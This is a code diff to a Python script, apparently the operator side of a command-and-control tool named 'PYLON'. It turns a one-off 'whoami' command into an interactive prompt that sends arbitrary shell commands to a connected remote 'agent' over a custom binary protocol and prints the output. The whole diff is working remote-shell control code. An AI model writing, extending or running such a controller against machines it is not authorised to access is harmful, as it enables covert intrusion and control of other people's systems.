@@ -24,26 +24,40 @@ def main():
     conn, addr = server.accept()
     print(f"Agent connection: {addr}")
     
+    print("==== PYLON ====")
+    
     try:
-        cmd = "whoami"
-        payload = cmd.encode()
-        header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
-        conn.sendall(header + payload)
-        print(f'Sent {cmd}')
-                
-        resp_header_raw = receive_exact(conn, 8)
-        if not resp_header_raw:
-            print("Agent disconnected")
-            return
-        
-        resp_id, resp_len = struct.unpack("!II", resp_header_raw)
-        print(f"Response header: ID={resp_id}, len={resp_len} bytes")
-        
-        if resp_len > 0:
-            result_raw = receive_exact(conn, resp_len)
-            print(f"Response:\n" + "-"*30)
-            print(result_raw.decode(errors='ignore').strip())
-            print("-" * 30)
+        while True:
+            cmd = input("pylon >")
+            
+            if not cmd:
+                continue
+            
+            if cmd in ['exit', 'quit']:
+                header = struct.pack("!II", 4, 0)
+                conn.sendall(header)
+                print("Closing session")
+                break
+            
+
+            payload = cmd.encode()
+            header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
+            conn.sendall(header + payload)
+            print(f'Sent {cmd}')
+                    
+            resp_header_raw = receive_exact(conn, 8)
+            if not resp_header_raw:
+                print("Agent disconnected")
+                return
+            
+            resp_id, resp_len = struct.unpack("!II", resp_header_raw)
+            print(f"Response header: ID={resp_id}, len={resp_len} bytes")
+            
+            if resp_len > 0:
+                result_raw = receive_exact(conn, resp_len)
+                print(f"Response:\n" + "-"*30)
+                print(result_raw.decode(errors='ignore').strip())
+                print("-" * 30)
         
     except Exception as e:
         print(f"Error: {e}")
